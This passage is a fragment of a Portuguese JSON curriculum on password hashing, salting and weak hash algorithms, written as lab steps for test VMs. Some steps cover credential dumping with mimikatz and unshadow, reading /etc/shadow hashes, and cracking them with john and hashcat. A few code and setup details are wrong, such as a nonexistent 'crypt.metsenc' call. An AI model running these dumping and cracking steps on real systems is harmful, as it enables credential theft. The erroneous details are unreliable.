                                    "Benchmark online de bcrypt (bcrypt-generator.com)"
                                  ],
                                  "tips": "Aumente o custo gradualmente até hash levar 0.1-1s para equilibrar segurança/usabilidade.",
                                  "learningObjective": "Aplicar conceitos de lentidão para escolher hashes adequados a senhas.",
                                  "commonMistakes": [
                                    "Usar SHA sem salt/custo para senhas.",
                                    "Confundir PBKDF2 com bcrypt (semelhantes mas diferentes)."
                                  ]
                                }
                              ],
                              "practicalExample": "Implemente em Python: gere hash bcrypt de 'MinhaSenha123' com custo 12, armazene em arquivo simulado de /etc/shadow. Tente verificar login correto/incorreto e meça tempo de hash. Simule ataque brute-force em 100 senhas e observe lentidão.",
                              "finalVerifications": [
                                "Explicar unidirecionalidade com exemplo numérico (hash de 2 strings).",
                                "Listar 3 riscos de colisões em hashing de senhas.",
                                "Comparar bcrypt vs. SHA-256 em termos de brute-force resistance.",
                                "Demonstrar verificação de senha via hash sem expor plaintext.",
                                "Calcular work factor necessário para 1 ano de cracking em GPU.",
                                "Identificar quando usar scrypt em vez de bcrypt (alta memória)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição de propriedades (sem confusões com encriptação).",
                                "Uso correto de exemplos concretos (bcrypt/scrypt com parâmetros).",
                                "Compreensão quantitativa (tempos, complexidade 2^n).",
                                "Aplicação a cenários reais (ataques, mitigações).",
                                "Clareza na explicação oral/escrita de todas propriedades.",
                                "Identificação de erros comuns em implementações."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Complexidade computacional e funções injetoras.",
                                "Programação: Implementação de bibliotecas crypto (Python hashlib, Node crypto).",
                                "Ética e Direito: LGPD/GDPR e proteção de dados sensíveis.",
                                "Hardware: Impacto de GPUs/ASICs em cracking de senhas.",
                                "Redes: Integração com protocolos como HTTPS para transmissão segura."
                              ],
                              "realWorldApplication": "Em sistemas operacionais como Linux (/etc/shadow com SHA-512 ou bcrypt), aplicações web (Django/Express com bcrypt), bancos de dados (armazenamento seguro de credenciais usuário), e conformidade com PCI-DSS para e-commerce, prevenindo vazamentos como Adobe 2013 onde hashes MD5 foram crackeados rapidamente."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.1.1.1"
                            ]
                          },
                          {
                            "id": "10.1.6.1.2.2",
                            "name": "Implementar hashing básico de senhas",
                            "description": "Usar bibliotecas como crypt() no Linux ou APIs do Windows para gerar hashes de senhas, demonstrando verificação de correspondência.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Hashing de Senhas",
                                  "subSteps": [
                                    "Pesquise o que é uma função hash e suas propriedades (unidirecional, determinística, colisão-resistente).",
                                    "Estude o papel do 'salt' para prevenir ataques de rainbow table.",
                                    "Leia documentação sobre crypt() no Linux (Python module) e equivalentes no Windows (como BCrypt API).",
                                    "Compare hashing com criptografia reversível, destacando por que hashing é preferível para senhas.",
                                    "Anote exemplos de algoritmos comuns: SHA-256, bcrypt, PBKDF2."
                                  ],
                                  "verification": "Escreva um resumo de 100 palavras explicando hashing vs. encryption e o uso de salt.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Python crypt module (docs.python.org)",
                                    "Artigos sobre bcrypt e salting (OWASP.org)",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Sempre use salt único por senha para máxima segurança; foque em bibliotecas prontas em vez de reinventar.",
                                  "learningObjective": "Explicar conceitos chave de hashing de senhas e identificar por que são essenciais para autenticação segura.",
                                  "commonMistakes": [
                                    "Confundir hashing com encryption reversível.",
                                    "Ignorar a necessidade de salt.",
                                    "Usar MD5 ou SHA-1 obsoletos sem iterações."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar o Ambiente de Desenvolvimento",
                                  "subSteps": [
                                    "Instale uma VM Linux (Ubuntu) ou use WSL no Windows.",
                                    "Instale Python 3 e verifique com 'python3 --version'.",
                                    "Instale módulo crypt se necessário: 'sudo apt install python3-crypt' ou use hashlib/bcrypt via pip.",
                                    "Crie um diretório de projeto e um arquivo teste.py.",
                                    "Teste importação: execute 'python3 -c \"import crypt; print(crypt.metsenc(1))\"'."
                                  ],
                                  "verification": "Ambiente pronto: rode um script simples que importe crypt sem erros.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "VM Ubuntu ou WSL",
                                    "Python 3",
                                    "Editor de texto (VS Code)"
                                  ],
                                  "tips": "Use um ambiente virtual com 'python -m venv env' para isolar dependências.",
                                  "learningObjective": "Preparar um ambiente funcional para experimentação com hashing em Linux/Windows.",
                                  "commonMistakes": [
                                    "Não ativar ambiente virtual.",
                                    "Usar Python 2 em vez de 3.",
                                    "Ignorar permissões sudo no Linux."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Geração de Hash de Senha",
                                  "subSteps": [
                                    "Gere um salt aleatório usando crypt.mksalt().",
                                    "Use crypt.crypt(senha, salt) para criar o hash.",
                                    "Escreva um script Python que recebe senha via input e imprime o hash gerado.",
                                    "Teste com a mesma senha + salt para confirmar determinismo.",
                                    "Adapte para Windows: use win32crypt ou instale bcrypt via pip."
                                  ],
                                  "verification": "Execute o script e confirme que gera um hash válido (ex: $6$salt$hash).",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Script Python (hash_gen.py)",
                                    "Terminal Linux/WSL"
                                  ],
                                  "tips": "Copie o salt do hash gerado para testes manuais; use '$6$' para SHA-512.",
                                  "learningObjective": "Gerar hashes de senhas seguras usando bibliotecas padrão.",
                                  "commonMistakes": [
                                    "Não incluir prefixo de algoritmo no salt.",
                                    "Armazenar senha em plain text.",
                                    "Reutilizar salt fixo."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar e Verificar Correspondência de Hash",
                                  "subSteps": [
                                    "Modifique o script para armazenar hash em arquivo ou variável.",
                                    "Crie função de verificação: crypt.crypt(input_senha, stored_hash) == stored_hash.",
                                    "Teste cenários: senha correta (True), incorreta (False).",
                                    "Adicione logging para depuração.",
                                    "Execute 10 testes variados e registre resultados."
                                  ],
                                  "verification": "Script verifica corretamente 100% das senhas testadas (5 corretas, 5 incorretas).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Script Python expandido (auth.py)",
                                    "Lista de senhas de teste"
                                  ],
                                  "tips": "O hash armazenado inclui o salt, então use-o diretamente na verificação.",
                                  "learningObjective": "Desenvolver lógica completa de autenticação por hash de senha.",
                                  "commonMistakes": [
                                    "Comparar hashes sem salt embutido.",
                                    "Expor hashes em logs.",
                                    "Não tratar erros de input vazio."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um script Python 'senha_auth.py' que: 1) Solicita senha nova, gera hash com salt SHA-512 e salva em 'users.txt'. 2) Solicita login, carrega hash e verifica match. Exemplo output: 'Senha: minha123 -> $6$abc$xyzHash'. Login 'minha123' -> 'Acesso concedido'. 'errada' -> 'Negado'.",
                              "finalVerifications": [
                                "Gera hashes consistentes para mesma senha + salt.",
                                "Verificação retorna True apenas para senha exata.",
                                "Script roda sem erros em Linux/WSL.",
                                "Hash usa algoritmo moderno (SHA-512 ou bcrypt).",
                                "Salt é único e aleatório por hash.",
                                "Nenhum plain text é armazenado ou logado."
                              ],
                              "assessmentCriteria": [
                                "Código é funcional e seguro (100% taxa de acerto em testes).",
                                "Explicação oral correta de hashing e salt.",
                                "Uso apropriado de bibliotecas sem reinventar wheel.",
                                "Tratamento de edge cases (senha vazia, caracteres especiais).",
                                "Tempo de execução <1s por verificação.",
                                "Documentação inline no código."
                              ],
                              "crossCurricularConnections": [
                                "Programação Python (manipulação de strings e arquivos).",
                                "Criptografia e Matemática (funções hash, probabilidades de colisão).",
                                "Desenvolvimento Web (integração com Flask/Django auth).",
                                "Ética em TI (segurança de dados, GDPR compliance).",
                                "Sistemas Operacionais (comandos shell, APIs nativas)."
                              ],
                              "realWorldApplication": "Implementado em sistemas de login de aplicações web, bancos de dados de usuários (ex: WordPress usa hashes), APIs de autenticação em servidores Linux, e ferramentas de compliance como auditorias de segurança em empresas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.1.1.2"
                            ]
                          },
                          {
                            "id": "10.1.6.1.2.3",
                            "name": "Analisar vulnerabilidades de hashes fracos",
                            "description": "Identificar problemas com MD5 ou SHA-1 em autenticação de SO e recomendar migração para PBKDF2 ou Argon2.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender vulnerabilidades de hashes fracos como MD5 e SHA-1",
                                  "subSteps": [
                                    "Estude as propriedades criptográficas de MD5 e SHA-1, focando em colisões e ataques de rainbow tables.",
                                    "Revise ataques conhecidos, como o de Wang para MD5 e SHAttered para SHA-1.",
                                    "Compare com hashes modernos: entenda por que MD5/SHA-1 são inadequados para senhas devido à velocidade.",
                                    "Leia documentação oficial da NIST sobre hashes depreciados (SP 800-131A).",
                                    "Pratique gerando hashes MD5/SHA-1 com ferramentas como openssl."
                                  ],
                                  "verification": "Explique em suas palavras 3 vulnerabilidades principais e cite um exemplo de ataque real.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação NIST SP 800-131A",
                                    "OpenSSL instalado",
                                    "Artigos sobre SHAttered attack"
                                  ],
                                  "tips": "Use diagramas para visualizar colisões; memorize que MD5 tem 128 bits e é colidível em segundos hoje.",
                                  "learningObjective": "Identificar por que MD5 e SHA-1 não são mais seguros para autenticação de senhas.",
                                  "commonMistakes": "Confundir hashes rápidos com seguros; ignorar contexto de senhas vs. integridade de arquivos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar uso de hashes fracos em autenticação de SO",
                                  "subSteps": [
                                    "Examine arquivos de configuração de senhas em Linux (/etc/shadow, /etc/login.defs) e Windows (SAM hive).",
                                    "Use comandos como 'chage -l' ou 'authconfig' para verificar algoritmo de hash ativo.",
                                    "Instale e use ferramentas como hashid ou john-the-ripper para identificar tipo de hash em dumps.",
                                    "Simule dump de senhas com mimikatz (Windows) ou unshadow (Linux).",
                                    "Verifique políticas de senha em Active Directory ou PAM."
                                  ],
                                  "verification": "Gere um relatório listando o algoritmo de hash usado em um ambiente de teste.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "VM Linux/Windows",
                                    "John the Ripper",
                                    "Mimikatz",
                                    "Hash Identifier tool"
                                  ],
                                  "tips": "Sempre teste em ambiente isolado para evitar exposição real; use $1$ para MD5, $5$/$6$ para SHA em shadow.",
                                  "learningObjective": "Detectar hashes MD5/SHA-1 em sistemas operacionais reais.",
                                  "commonMistakes": "Não diferenciar hashes de senhas de hashes de arquivos; pular verificação de salt."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar impactos e riscos das vulnerabilidades",
                                  "subSteps": [
                                    "Calcule tempo de crack com hashcat para MD5 vs. bcrypt em hardware GPU.",
                                    "Avalie cenários: brute-force offline, rainbow tables, e impactos em breaches.",
                                    "Quantifique riscos: probabilidade de sucesso de ataque em 24h para senhas comuns.",
                                    "Documente mitigações parciais como salts longos, mas destaque limitações.",
                                    "Crie uma matriz de risco (confidencialidade, integridade, disponibilidade)."
                                  ],
                                  "verification": "Produza uma tabela comparativa de tempo de crack para 3 senhas de teste.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Hashcat instalado",
                                    "GPU para benchmarks",
                                    "Rainbow tables pré-geradas"
                                  ],
                                  "tips": "Use --force para hashcat em VM; foque em senhas reais fracas como 'password123'.",
                                  "learningObjective": "Quantificar riscos de hashes fracos na autenticação.",
                                  "commonMistakes": "Subestimar poder de GPUs modernas; ignorar custo-benefício para atacantes."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Recomendar migração para PBKDF2 ou Argon2",
                                  "subSteps": [
                                    "Estude parâmetros recomendados: Argon2id com memory=64MB, iterations=3 para PBKDF2.",
                                    "Configure em Linux: edite /etc/pam.d/common-password com argon2 ou pbkdf2.",
                                    "Teste migração em Windows via group policy para PBKDF2.",
                                    "Planeje rollout: hash híbrido durante transição, teste compatibilidade.",
                                    "Crie script de auditoria automatizado para verificação pós-migração."
                                  ],
                                  "verification": "Implemente e teste migração em VM, confirmando novo hash com hashid.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Documentação Argon2",
                                    "Libpwquality",
                                    "PowerShell para Windows"
                                  ],
                                  "tips": "Comece com Argon2 por ser memory-hard; valide com 'pwck' após mudanças.",
                                  "learningObjective": "Propor e executar plano de migração seguro para hashes modernos.",
                                  "commonMistakes": "Usar parâmetros fracos; não testar reversibilidade de autenticação durante transição."
                                }
                              ],
                              "practicalExample": "Em um servidor Ubuntu com /etc/shadow usando SHA-512 (mas configurado para fallback MD5), identifique via 'grep ^user: /etc/shadow | cut -d: -f2', cracke uma senha fraca com john, então migre para Argon2 editando /etc/pam.d/common-password e re-hashando senhas com 'passwd'.",
                              "finalVerifications": [
                                "Lista corretamente 4 vulnerabilidades de MD5/SHA-1.",
                                "Identifica algoritmo de hash em dump de /etc/shadow.",
                                "Benchmark mostra crack MD5 em <1min vs. Argon2 >dias.",
                                "Configura e testa migração em VM sem quebrar login.",
                                "Relatório inclui matriz de risco e plano de rollout.",
                                "Explica trade-offs entre PBKDF2 e Argon2."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de hashes fracos (90%+).",
                                "Análise quantitativa de riscos com benchmarks reais.",
                                "Recomendações seguem NIST/OWASP guidelines.",
                                "Plano de migração é stepwise e testável.",
                                "Relatório é claro, com evidências (screenshots/logs).",
                                "Considera cenários edge como legacy systems."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia Avançada: KDFs e funções de derivação de chave.",
                                "Administração de Sistemas: Configuração PAM e Group Policy.",
                                "Análise Forense: Extração e cracking de hashes.",
                                "Desenvolvimento Seguro: Implementação de hashing em apps."
                              ],
                              "realWorldApplication": "Durante auditorias de segurança em empresas, pentests para detectar MD5 em AD, ou conformidade PCI-DSS/NIST, recomendando migração para prevenir breaches como o LinkedIn 2012 onde SHA-1 unsalted foi crackado."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.1.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.1.3",
                        "name": "Salting em Mecanismos de Autenticação",
                        "description": "Técnica de adicionar valores únicos (salts) aos hashes para prevenir ataques de tabela arco-íris e reutilização de hashes em múltiplas contas.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.1.3.1",
                            "name": "Definir o conceito de salt e sua importância",
                            "description": "Explicar como salts únicos por usuário evitam ataques pré-computados e fortalecem a segurança em arquivos como /etc/shadow.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos de Hashing de Senhas",
                                  "subSteps": [
                                    "Explicar o que é uma função hash e suas propriedades (unidirecional, determinística, colisão-resistente).",
                                    "Descrever como senhas são armazenadas como hashes em vez de texto plano para proteção.",
                                    "Comparar hashing simples (ex: MD5) com hashing lento para senhas (ex: bcrypt, scrypt).",
                                    "Visualizar um exemplo de hashing de senha sem proteção adicional.",
                                    "Discutir por que hashes idênticos para senhas iguais criam vulnerabilidades."
                                  ],
                                  "verification": "Resumir em 3 frases o que é hashing de senhas e liste 3 propriedades chave.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação sobre funções hash (MD5, SHA-256)",
                                    "Ferramenta online de hash demo (ex: CyberChef)"
                                  ],
                                  "tips": "Use analogias como 'máquina de moer carne' para hashing unidirecional.",
                                  "learningObjective": "Compreender o papel básico do hashing na proteção de senhas.",
                                  "commonMistakes": "Confundir hashing com criptografia reversível; assumir que todos os hashes são seguros."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Vulnerabilidades de Ataques Pré-Computados",
                                  "subSteps": [
                                    "Explicar ataques de dicionário e rainbow tables usando hashes pré-calculados.",
                                    "Demonstrar como senhas comuns (ex: '123456') têm hashes conhecidos em tabelas públicas.",
                                    "Mostrar impacto em sistemas com hashes idênticos para usuários com mesmas senhas.",
                                    "Analisar um exemplo de banco de dados vazado sem salts.",
                                    "Calcular tempo de quebra de hash simples vs. rainbow table."
                                  ],
                                  "verification": "Identificar 2 ataques pré-computados e explicar por que hashes duplicados facilitam eles.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Exemplos de rainbow tables online",
                                    "Lista de senhas comuns (RockYou.txt snippet)"
                                  ],
                                  "tips": "Teste hashing de senhas comuns para ver colisões reais.",
                                  "learningObjective": "Reconhecer limitações do hashing puro contra ataques offline.",
                                  "commonMistakes": "Subestimar velocidade de GPUs em cracking; ignorar senhas fracas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definir e Explorar o Conceito de Salt",
                                  "subSteps": [
                                    "Definir salt como valor aleatório único adicionado à senha antes do hash.",
                                    "Explicar geração de salts (aleatórios, por usuário, armazenados com o hash).",
                                    "Mostrar fórmula: hash(senha + salt) vs. hash(senha) + salt.",
                                    "Demonstrar com exemplo: usuário A e B com mesma senha geram hashes diferentes.",
                                    "Discutir tamanho ideal de salt (ex: 16-32 bytes)."
                                  ],
                                  "verification": "Gerar manualmente um hash com salt para uma senha e explicar a diferença.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de texto ou Python para simular hash+salt",
                                    "Biblioteca hashlib em Python"
                                  ],
                                  "tips": "Sempre use random salts; nunca reutilize.",
                                  "learningObjective": "Definir salt e entender seu mecanismo básico.",
                                  "commonMistakes": "Usar salt global (mesmo para todos); confundir salt com IV em criptografia."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Importância e Implementação em Sistemas Reais",
                                  "subSteps": [
                                    "Explicar como salts evitam pré-computação ao tornar cada hash único.",
                                    "Explorar /etc/shadow no Linux: formato $id$salt$hash.",
                                    "Comparar autenticação com e sem salts em cenários de breach.",
                                    "Discutir salts em frameworks modernos (bcrypt inclui salt).",
                                    "Avaliar trade-offs: custo computacional vs. segurança."
                                  ],
                                  "verification": "Descrever como salts fortalecem /etc/shadow e dar um exemplo de linha.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "/etc/shadow exemplo anonimizado",
                                    "Documentação Linux shadow utils"
                                  ],
                                  "tips": "Examine /etc/shadow em VM segura para ver salts reais.",
                                  "learningObjective": "Compreender importância prática de salts em autenticação.",
                                  "commonMistakes": "Achar que salt protege contra brute-force online; ignorar key derivation functions."
                                }
                              ],
                              "practicalExample": "Em um sistema Linux, para dois usuários com senha 'password123': Usuário1 tem salt 'a1b2c3' → hash('password123a1b2c3'); Usuário2 tem salt 'x9y8z7' → hash('password123x9y8z7'). Mesmo vazamento não permite rainbow table pré-computada.",
                              "finalVerifications": [
                                "Explicar salt em próprias palavras sem consultar notas.",
                                "Diferenciar hash com e sem salt em um diagrama simples.",
                                "Identificar salt em uma linha de /etc/shadow.",
                                "Simular ataque pré-computado falhando com salts.",
                                "Listar 3 benefícios de salts únicos por usuário.",
                                "Comparar segurança de MD5(senha) vs. bcrypt(senha+salt)."
                              ],
                              "assessmentCriteria": [
                                "Definição precisa de salt (aleatório, único, pré-hash).",
                                "Explicação correta de prevenção a rainbow tables.",
                                "Entendimento de implementação em /etc/shadow.",
                                "Identificação de erros comuns em hashing sem salt.",
                                "Uso de exemplos concretos e técnicos.",
                                "Conexão clara entre conceito e segurança prática."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Funções hash e propriedades probabilísticas (colisões).",
                                "Programação: Implementação de hashing em Python ou C.",
                                "Ética: Implicações de breaches de dados e privacidade.",
                                "Sistemas Operacionais: Gerenciamento de usuários no Linux/Unix."
                              ],
                              "realWorldApplication": "Em servidores web e clouds (ex: AWS IAM, Linux servers), salts únicos por usuário em /etc/shadow ou databases previnem que atacantes usem tabelas pré-computadas em dumps como o LinkedIn breach de 2012, forçando recomputação custosa por hash."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.1.2.1"
                            ]
                          },
                          {
                            "id": "10.1.6.1.3.2",
                            "name": "Aplicar salting em hashing de senhas",
                            "description": "Gerar e armazenar salts aleatórios junto com hashes em um sistema operacional, verificando autenticação com salt concatenado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Hashing e Salting",
                                  "subSteps": [
                                    "Estude o conceito de função hash: unidirecional, determinística e de comprimento fixo.",
                                    "Analise ataques como rainbow tables e como hashes sem salt são vulneráveis.",
                                    "Explique o papel do salt: valor aleatório e único por usuário para prevenir ataques pré-computados.",
                                    "Compare algoritmos como SHA-256 puro vs. PBKDF2 ou bcrypt com salt.",
                                    "Discuta armazenamento: salt + hash concatenados no banco de dados."
                                  ],
                                  "verification": "Escreva um resumo de 200 palavras explicando por que salting é essencial, com exemplos de vulnerabilidades.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação Python hashlib e secrets",
                                    "Artigos sobre OWASP Password Storage",
                                    "Vídeo tutorial sobre salting (5-10 min)"
                                  ],
                                  "tips": "Prefira bibliotecas como bcrypt ou Argon2 para produção; evite SHA-1 ou MD5.",
                                  "learningObjective": "Dominar os conceitos teóricos de hashing e salting para aplicação segura.",
                                  "commonMistakes": [
                                    "Usar salt reutilizável entre usuários",
                                    "Confundir salt com chave de criptografia simétrica",
                                    "Achar que hash sem salt é suficiente contra brute-force"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar Salt Aleatório de Forma Segura",
                                  "subSteps": [
                                    "Instale Python e módulos necessários: pip install bcrypt (opcional para comparação).",
                                    "Importe módulos: import secrets, import base64.",
                                    "Gere salt: salt = secrets.token_bytes(16).",
                                    "Codifique para armazenamento: salt_b64 = base64.b64encode(salt).decode('utf-8').",
                                    "Teste gerando 3 salts diferentes e verifique unicidade."
                                  ],
                                  "verification": "Execute código para gerar e imprimir 5 salts únicos; confirme que variam a cada execução.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Python 3.8+",
                                    "Editor de código (VS Code ou IDLE)",
                                    "Terminal para execução"
                                  ],
                                  "tips": "Use secrets ao invés de random para criptografia; tamanho mínimo 16 bytes.",
                                  "learningObjective": "Gerar salts criptograficamente seguros e adequados para armazenamento.",
                                  "commonMistakes": [
                                    "Usar random.random() em vez de secrets",
                                    "Salt muito curto (<8 bytes)",
                                    "Não codificar para texto legível"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar Salting e Hashing à Senha",
                                  "subSteps": [
                                    "Defina função hash_password(senha, salt): concatene senha.encode() + salt.",
                                    "Use PBKDF2: hashlib.pbkdf2_hmac('sha256', senha_salt, salt, 100000).",
                                    "Codifique o hash final em base64.",
                                    "Armazene como: stored = salt_b64 + ':' + hash_b64 em arquivo ou dict simulando BD.",
                                    "Teste hashing de 2 senhas diferentes com salts únicos."
                                  ],
                                  "verification": "Crie hashes para 'senha123' e 'outra456'; armazene e liste-os corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Python com hashlib",
                                    "Arquivo texto para simular BD (ex: users.txt)"
                                  ],
                                  "tips": "Aumente iterações (100k+) para lentidão contra brute-force; nunca logue senhas.",
                                  "learningObjective": "Implementar hashing lento e salted de senhas de forma programática.",
                                  "commonMistakes": [
                                    "Concatenar salt após senha consistentemente",
                                    "Poucas iterações (<10k)",
                                    "Armazenar senha em claro"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Verificação de Autenticação",
                                  "subSteps": [
                                    "Defina função verify_password(senha, stored): split stored em salt_b64 e hash_b64.",
                                    "Decode salt e gere novo_hash com mesma senha + salt.",
                                    "Compare: secrets.compare_digest(novo_hash_b64, hash_b64) para timing-safe.",
                                    "Teste login: aceite senha correta, rejeite incorreta e variações.",
                                    "Simule falhas: teste com salt errado ou hash alterado."
                                  ],
                                  "verification": "Execute 10 testes: 5 corretos (pass), 5 incorretos (fail); log resultados.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Código dos steps anteriores",
                                    "Script de teste unitário"
                                  ],
                                  "tips": "Sempre use compare_digest para evitar timing attacks.",
                                  "learningObjective": "Verificar senhas de forma segura sem expor vulnerabilidades.",
                                  "commonMistakes": [
                                    "Comparar strings com == (timing attack)",
                                    "Não extrair salt corretamente",
                                    "Re-hash sem salt original"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Validar o Sistema Completo",
                                  "subSteps": [
                                    "Crie script completo: register_user() e login_user().",
                                    "Registre 3 usuários com senhas/salts/hashes.",
                                    "Teste autenticação em loop: 20 tentativas mistas.",
                                    "Verifique segurança: tente rainbow table (hashes iguais sem salt falham).",
                                    "Documente código com comentários e rode em ambiente isolado."
                                  ],
                                  "verification": "Sistema aceita apenas senhas corretas; relatório de testes sem falhas lógicas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Script Python completo",
                                    "Ferramenta de diff para hashes"
                                  ],
                                  "tips": "Use virtualenv para isolamento; teste com senhas comuns para demo.",
                                  "learningObjective": "Validar implementação end-to-end contra cenários reais de ataque.",
                                  "commonMistakes": [
                                    "Reutilizar salts",
                                    "Expor hashes em logs",
                                    "Ignorar case-sensitive em senhas"
                                  ]
                                }
                              ],
                              "practicalExample": "Implemente um sistema de registro/login simples em Python para 3 usuários. Registre 'user1:senha123' gerando salt único, hash PBKDF2 e armazene em 'users.db' (arquivo JSON). No login, input usuário/senha, extraia salt, re-hashed e compare. Teste: login correto OK, 'senha124' falha, ataque com hash pré-computado sem salt falha.",
                              "finalVerifications": [
                                "Cada usuário tem salt único e aleatório (verifique variabilidade).",
                                "Hashing usa ≥100k iterações e é lento (>100ms por hash).",
                                "Verificação usa compare_digest (sem timing leaks).",
                                "Sistema rejeita 100% senhas incorretas em 20 testes.",
                                "Armazenamento separa salt e hash claramente (ex: ':').",
                                "Não há senhas em claro no código ou logs."
                              ],
                              "assessmentCriteria": [
                                "Correção técnica: hashing salted e verificação funcionam perfeitamente.",
                                "Segurança: uso de primitives cripto seguras (secrets, PBKDF2, compare_digest).",
                                "Eficiência: salts ≥16 bytes, iterações adequadas.",
                                "Robustez: trata erros (senha None, stored inválido).",
                                "Documentação: código comentado explicando cada parte.",
                                "Testes: cobertura de casos positivos/negativos."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Manipulação de strings/bytes em Python.",
                                "Matemática: Funções hash e propriedades criptográficas.",
                                "Ética: Responsabilidade em proteção de dados pessoais (LGPD/GDPR).",
                                "Redes: Integração com autenticação em apps web (Flask/Django).",
                                "Banco de Dados: Armazenamento seguro em SQL/NoSQL."
                              ],
                              "realWorldApplication": "Em servidores web (ex: Linux com Apache/Nginx), bancos de dados de usuários (MySQL/PostgreSQL) para autenticação segura em e-commerces, bancos online ou sistemas corporativos, prevenindo vazamentos como no caso LinkedIn 2012 onde falta de salting permitiu rainbow tables."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.1.2.2"
                            ]
                          },
                          {
                            "id": "10.1.6.1.3.3",
                            "name": "Avaliar implementação de salts em SO reais",
                            "description": "Analisar como Linux (com $6$ para SHA-512) e Windows (NTLM) usam salts, identificando boas práticas e falhas comuns.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Salting e Preparar Ambiente de Análise",
                                  "subSteps": [
                                    "Revise definições de salting: valor aleatório único adicionado à senha antes do hash para prevenir ataques de rainbow tables.",
                                    "Instale VMs seguras: Ubuntu para Linux e Windows 10/11 para análise isolada.",
                                    "Instale ferramentas: no Linux, use `mkpasswd` e `john`; no Windows, use PowerShell ou Mimikatz em ambiente controlado.",
                                    "Crie contas de teste com senhas simples para gerar hashes.",
                                    "Documente estrutura geral de hashes: identificador (ex: $6$ para SHA-512 no Linux)."
                                  ],
                                  "verification": "Ambiente pronto com hashes gerados de contas de teste visíveis em /etc/shadow (Linux) ou SAM (Windows).",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "VMs Ubuntu e Windows",
                                    "Ferramentas: mkpasswd, John the Ripper, PowerShell",
                                    "Documentação: man crypt(3), MS Docs NTLM"
                                  ],
                                  "tips": "Use snapshots nas VMs para resetar facilmente após testes.",
                                  "learningObjective": "Entender o papel do salt na mitigação de ataques offline.",
                                  "commonMistakes": "Confundir salt com IV ou nonce; ignorar isolamento de VMs para segurança."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Implementação de Salts no Linux ($6$ SHA-512)",
                                  "subSteps": [
                                    "Examine /etc/shadow: formato hash é $id$salt$hash (ex: $6$abc$... para SHA-512).",
                                    "Gere hashes com `mkpasswd -m sha-512` e compare com shadow.",
                                    "Teste extração com John: `john --format=sha512crypt shadow` para ver salt separado.",
                                    "Verifique tamanho do salt: tipicamente 16 chars base64 (96 bits).",
                                    "Analise rotação: salts únicos por usuário via `pwgen` ou rand."
                                  ],
                                  "verification": "Relatório com exemplo de hash Linux desmontado: identificador, salt e hash identificados corretamente.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "/etc/shadow (permissões root)",
                                    "mkpasswd, John the Ripper",
                                    "Referência: crypt(3) man page"
                                  ],
                                  "tips": "Use `sudo` para shadow; teste com senhas fracas para depuração rápida.",
                                  "learningObjective": "Dissecar formato exato de salting no Linux e SHA-512.",
                                  "commonMistakes": "Acessar shadow sem root; confundir salt com o hash completo."
                                },
                                {
